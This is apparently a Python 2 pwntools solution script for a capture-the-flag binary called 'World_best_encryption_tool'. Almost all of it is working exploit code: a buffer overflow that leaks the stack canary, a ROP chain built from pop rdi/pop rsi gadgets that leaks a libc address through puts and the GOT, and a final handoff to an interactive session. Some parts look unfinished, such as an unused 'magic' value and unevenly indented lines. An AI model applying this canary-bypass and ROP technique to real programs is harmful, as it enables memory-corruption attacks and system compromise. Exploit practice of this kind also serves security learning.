#!/usr/bin/python2

from pwn import *
import time
import sys


puts_plt = 0x4005e0
puts_got = 0x601020
magic = 0x0
poprdi = 0x4008e3
poprsi = 0x4008e1
test_string = 0x400913	# %s

def func(func_addr, args):
    if len(args) > 2:
        print 'we can use only 2 arg'
        sys.exit(0)

	global poprdi
	global poprsi

    gadget = [poprdi, poprsi]
    payload = ''
    for arg in args:
        payload += p64(gadget[args.index(arg)])
    payload += p64(func_addr)
    return payload

p = process("World_best_encryption_tool")
print p.recv()	# your text)

# 1. leak canary
log.info('leak canary')
payload = 'a'*0x39
p.sendline(payload)
time.sleep(0.4)
print p.recvuntil('a'*7)
canary = unpack('\x00'+p.recv()[:7], 'all', endian='little')

print 'canary: ', hex(canary)
p.sendline('Yes')
print p.recv(4096)

# 2. leak libc base
log.info('leak libc')
payload = 'a'*0x78
payload += p64(canary)	# 0x40
payload += 'b'*0x8
payload += func(puts_plt, [puts_got])
p.sendline(payload)
time.sleep(0.4)
puts_addr = u64(p.recv(8))

print 'puts addr: ', hex(puts_addr)
print p.recvuntil('Wanna encrypt other text? (Yes/No)\n')
p.sendline("Yes")
print p.recv(4096)

# -. test puts addr
log.info('puts test')
payload = 'a'*0x78
payload += p64(canary)
payload += 'b'*0x8
payload += func(puts_addr, [test_string])
p.sendline(payload)
time.sleep(0.4)

print p.recvuntil('Wanna encrypt other text? (Yes/No)\n')
p.sendline('Yes')
print p.recv(4096)

# 99. insert null into canary's last byte
log.info('epilogue')
payload = 'a'*0x38
p.sendline(payload)
time.sleep(0.4)

print p.recvuntil('Wanna encrypt other text? (Yes/No)\n')
p.sendline('No')

p.interactive()
